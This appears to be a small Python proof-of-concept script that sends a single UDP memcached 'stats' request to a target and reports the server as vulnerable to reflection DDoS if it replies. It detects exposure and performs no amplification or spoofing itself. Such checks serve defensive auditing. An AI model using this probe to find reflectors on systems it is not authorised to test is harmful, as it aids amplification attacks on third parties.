#!/usr/bin/env python
#--*-- coding:utf-8 --*--
#__author__ = 'Kios'
import socket

class Poc:
    '''
    Memcached UDP ddos Proof of concept
    Education purpose only, do not use illegal way!
    '''
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto('\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',(self.ip, self.port))
        
            data, _ = s.recvfrom(1024)
            if data:
                print(">>>Receive Data:", data)
                print("Server is vulnerable!")
            else:
                print("Server is not vulnerable!")
        
            s.close()
        except Exception as e:
            print("Error encountered due to:", str(e))

if __name__ == '__main__':
    obj1 = Poc('127.0.0.1', 11211)
    obj1.run()
